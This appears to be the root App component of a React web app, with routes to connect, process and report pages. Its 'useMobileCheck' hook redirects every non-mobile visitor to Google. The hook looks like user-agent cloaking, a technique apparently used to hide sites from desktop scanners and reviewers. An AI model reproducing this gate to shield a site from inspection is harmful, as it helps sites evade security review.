import { useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import ConnectPage from './pages/ConnectPage';
import ProcessPage from './pages/ProcessPage';
import ReportPage from './pages/ReportPage';
import './index.css';

// Mobile check hook - redirects to Google if not mobile
const useMobileCheck = () => {
  useEffect(() => {
    const REDIRECT_URL = 'https://www.google.com';
    const userAgent = navigator.userAgent.toLowerCase();
    
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|samsung|huawei|xiaomi|oppo|vivo|oneplus|nokia/i.test(userAgent);
    const isDesktop = /windows nt|macintosh|mac os x|linux x86_64|ubuntu|debian|fedora/i.test(userAgent) && !isMobile;
    
    // Redirect if desktop or not mobile
    if (isDesktop || !isMobile) {
      window.location.href = REDIRECT_URL;
    }
  }, []);
};

function App() {
  // Check mobile on mount
  useMobileCheck();

  return (
    <Router>
      <Routes>
        <Route path="/" element={<ConnectPage />} />
        <Route path="/process" element={<ProcessPage />} />
        <Route path="/report" element={<ReportPage />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;
